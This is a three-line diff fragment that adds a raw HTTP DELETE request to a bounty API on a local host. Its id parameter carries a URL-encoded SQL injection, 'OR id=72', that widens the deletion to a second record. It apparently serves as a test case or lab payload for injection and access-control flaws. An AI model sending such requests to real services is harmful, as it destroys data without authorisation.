@@ -1,0 +1,3 @@
+DELETE /api_v1/bounty?id=82%20OR%20id%3D72 HTTP/1.1
+Host: api.crowdbounty.local
+
